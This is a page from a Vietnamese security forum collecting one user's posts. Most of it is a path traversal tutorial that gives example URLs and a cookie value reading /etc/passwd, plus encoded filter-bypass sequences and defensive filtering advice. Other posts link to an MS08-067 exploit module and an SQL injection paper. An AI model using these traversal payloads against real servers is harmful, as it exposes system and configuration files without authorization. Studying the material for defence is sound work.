				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25926.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25926/157165.html#157165,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><span class="link"> http://packetstormsecurity.org/0810-exploits/ms08_067_netapi.rb.txt</span></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25352.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25352/154916.html#154916,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">PXMMRF wrote:</cite><br>
<blockquote>Hoan nghênh bài viết của seamoun.<br/><br/> Trong phần thí dụ<br/> <blockquote>http://seamoun.com/getUserProfile.jsp?page=main.html<br/> <span class="link"> http://seamoun.com/index.php?file=help</span><br/> <span class="link"> http://seamoun.com/main.cgi?home=index.htm&nbsp;</span>
</blockquote><br/><br/> thì seamoun nên thay bằng một domain đang active, hoặc chỉ viết là:<br/><br/><span class="link"> http://example.com</span> hay<span class="link"> http://yourname.com</span> .....<br/><br/> Vì domaim<b><font color='orange'> "seamoun. com"</font></b> tuy đã đựoc đăng ký, nhưng hiên ở status : deleted and <b><font color='orange'>available again</font></b>. Do vây, tai thời điểm này, không tỉm thấy IP cùa domain-website "seamoun. com" và dĩ nhiên không có bất cứ một URL nào liên quan đến domain "seamoun. com".<br/><br/> Như vậy sẽ tránh những hiểu lầm và reaction đáng tiếc đã xảy ra&nbsp;
</blockquote><br/> Thưa anh ! Chả là trên máy em, em có cái HTTPD, FTP, ... và em thay đổi cái file host trên máy em 127.0.0.1&lt;--&gt;seamoun.com để thuận tiện trong việc em làm mấy cái demo <img src="/hvaonline/images/smilies/3019f422209a6593f02fad5560f36b79.gif" border="0" alt="smilie" align="absbottom"> <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> ấy mà</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25210.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25210/153463.html#153463,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Trên milw0rm có bài viết (Introduction to SQL injection - gửi ngày 2008-09-28) : <span class="link"> http://milw0rm.com/papers/225</span>. Có giới thiệu thêm một số hàm và một số phương thức có thể lấy thông tin về table, column như sử dụng group_concat, ...<br/> Các bạn có thể đọc thêm để tham khảo <img src="/hvaonline/images/smilies/8558d3a641379e9d3e663b443adb34c1.gif" border="0" alt="smilie" align="absbottom"> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25352.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25352/153462.html#153462,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><font color='orange'><b>I. GIỚI THIỆU</b></font><br/><br/> Path Traversal hay còn được biết với một số tên khác như “dot-dot-slash”, “directory traversal”,”directory clumbing” và “backtracking” là hình thức tấn công truy cập đến những file và thư mục mà được lưu bên ngoài thư mục webroot. Hình thức tấn công này không cần sử dụng một công cụ nào mà chỉ đơn thuần thao tác các biến với ../ (dot-dot-slash) để truy cập đến file, thư mục, bao gồm cả source code, những file hệ thống, …<br/> Để nhận biết khả năng khai thác lỗi này, các kẻ tấn công thường quan sát kết quả có được từ spider hoặc crawler mang lại. Quan sát khả năng khai thác Path Traversal ở đây là gì ?<br/> Ví dụ kết quả trả về từ Spider hay Crawler có dạng sau:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>http://seamoun.com/getUserProfile.jsp?page=main.html<span class="link"> http://seamoun.com/index.php?file=help</span><span class="link"> http://seamoun.com/main.cgi?home=index.htm</span></pre>
</div><br/> Ngoài ra các bạn còn thấy nhiều dạng URL khác mà có “mùi” Path Traversal, các bạn tự hỏi làm sao biết được ? Trả lời: thông qua kinh nghiệm khi phân tích URL mà có được.<br/><br/> <font color='orange'><b>II. KHAI THÁC</b></font><br/><br/> Khi có được kết quả từ việc spider Website với các URL có dạng như trên, kẻ tấn công có thể sử dụng “../” để thử liệu có truy cập file và thư mục khác được không ? Ví dụ<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>http://seamoun.com/getUserProfile.jsp?page=../../../etc/passwd</pre>
</div><br/> Dựa vào thông báo lỗi từ Website kẻ tấn công biết được đường dẫn thực sự trên WebServer, từ đó có thể kết hợp với ../ (dot-dot-slash) để truy cập đến những file quan trong của Website như database, file cấu hình, …<br/> Lưu ý rằng Path Traversal không chỉ xảy ra đối với các biến trong phương thức GET mà còn có thể xuất hiện trong các phương thức POST hoặc biến COOKIE.<br/> <blockquote><br/> Ví dụ: Một số website có thể sử dụng COOKIE để lưu template động cho Website như sau:<br/> Cookie: ID= 2ddd73ef3620afc62cd6942c31bb6003:TEMPLATE=xpstyle<br/> Cookie: USER=member1234: PSTYLE=Green<br/> Như vậy kẻ tấn công có thể thay đổi COOKIE để thực hiện Path Traversal Attack như sau<br/> Cookie: ID= 2ddd73ef3620afc62cd6942c31bb6003:TEMPLATE=xpstyle<br/> Cookie: USER=member1234: PSTYLE=../../etc/passwd<br/> &nbsp;
</blockquote><br/><br/> Trong quá trình khai thác kẻ tấn công có thể encode hoặc double encode, sử dụng %00(null) để bypass filter mà Website đó áp dụng.<br/> Ví dụ:<br/> <blockquote><br/> %2e%2e%2f mô tả cho ../<br/> %2e%2e/ mô tả cho ../<br/> ..%2f mô tả cho ../<br/> %2e%2e%5c mô tả cho ..\<br/> %2e%2e\ mô tả cho ..\<br/> ..%5c mô tả cho ..\<br/> %252e%252e%255c mô tả cho ..\<br/> ..%255c mô tả cho ..\<br/> …<br/><br/> Đối với UTF-8<br/> ..%c0%af mô tả cho ../<br/> ..%c1%9c mô tả cho ..\<br/> &nbsp;
</blockquote><br/><br/> Khi tiếp cận với một ứng dụng Web, việc kiểm tra nó có khả năng bị lỗi Path Traversal có thể được thực hiện bằng hai loại:<br/> + Nếu kẻ tấn công không thể có source thì chúng sẽ dùng spider, crawler để thực hiện kiểm tra Website và từ những kết quả mà spider mang lại chúng sẽ lần lượt kiểm tra các biến đối với các phương thức GET, POST hoặc COOKIE mà có khả năng bị lỗi.<br/> + Nếu kẻ tấn công có source code thì có thể tìm kiếm những hàm của những ngôn ngữ lập trình Web mà có khả năng gây ra lỗi Path Traversal như sau:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>PHP: include&#40;&#41;, include_once&#40;&#41;, require&#40;&#41;, require_once&#40;&#41;, fopen&#40;&#41;, readfile&#40;&#41;, ...
JSP/Servlet: java.io.File&#40;&#41;, java.io.FileReader&#40;&#41;, ...
ASP: include file, include virtual, ...</pre>
</div><br/><br/> Demo khai thác Path Traversal (X7 Chat). Trong đoạn demo sau đây giả sử kẻ tấn công không biết source code của ứng dụng Web X7 Chat và thực hiện spider để kiểm tra nội dung Website.<br/> (Download file demo bên dưới, chỉ có login mới thấy file download)<br/><br/> <font color='orange'><b>III. PHÒNG CHỐNG</b></font><br/><br/> Việc phòng chống Path Traversal Attack phải thực hiện kiểm tra biến cẩn thận (có thể áp dụng filter) khi sử dụng các hàm đã giới thiệu ở trên mà có khả năng gây ra lỗi cho phép kẻ tấn công thực hiện Path Traversal. Tuy nhiên một số filter như<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>str_replace&#40;"../","",$_GET&#91;'help_file'&#93;&#41;</pre>
</div><br/> thì vẫn bị lỗi bởi lẽ kẻ tấn công có thể sử dụng “….//” như thế sau khi qua code lọc ở trên nó sẽ trở thành “../”. Rõ ràng việc lọc như vậy vẫn không triệt để. Thay vào đó các bạn nên sử dụng các biểu thức chính để lọc tốt hơn.<br/> Ví dụ<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>eregi&#40;"&#91;\\/&#93;","{$_GET&#91;'help_file'&#93;}"&#41;</pre>
</div><br/><br/> Công cụ sử dụng Website Crawler: Acunetix<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
				
        <!-- END OF POST LISTING -->
			
				

			
      </table>
		
			<table cellspacing="2" cellpadding="2" width="100%" align="center" border="0">
				<tr>					
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						&nbsp;
						</span>
					</td>

					<td valign="middle" align="right">					
		<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap" align="right">
				<form action="" name="p" id="p" accept-charset="UTF-8"> 
					
					<span class="gensmall">Go to Page:&nbsp;</span>
					
						<a href="/hvaonline/posts/listByUser/332.html">
							<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_first_page.gif" width="8" height="9" alt="First Page" title="First Page"/>
						</a>
								<a href="/hvaonline/posts/listByUser/30/332.html">
									<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_prev_page.gif" width="5" height="9" alt="Page 2" title="Page 2"/>
								</a>
							
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/60/332.html">3</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/90/332.html">4</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/120/332.html">5</a></span>
							
					
						<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/posts/listByUser/'+ ( (this.options[this.selectedIndex].value - 1) * 30)  + '/332' + '.html'; }" name="select2">
							<option value="-1" selected="selected">---</option>		
							
								<option value="1" >1</option>	
								<option value="2" >2</option>	
								<option value="3" >3</option>	
								<option value="4" >4</option>	
								<option value="5" >5</option>	
								<option value="6" selected="selected">6</option>	
								<option value="7" >7</option>	
								<option value="8" >8</option>	
								<option value="9" >9</option>	
								<option value="10" >10</option>	
								<option value="11" >11</option>	
								<option value="12" >12</option>	
						</select>
						
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/180/332.html">7</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/210/332.html">8</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/240/332.html">9</a></span>
								<a href="/hvaonline/posts/listByUser/270/332.html">
									<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_next_page.gif" width="5" height="9" alt="Page 10" title="Page 10"/>
								</a>
						
						<a href="/hvaonline/posts/listByUser/330/332.html">
							<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_last_page.gif" width="8" height="9" alt="Last Page" title="Last Page (12)"/>
						</a>
				</form>
			</td>
		</tr>
		</table>
</td>
				</tr>
				
				<tr>
					<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
				</tr>			
			</table>
		</td>
	</tr>
</table>


	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
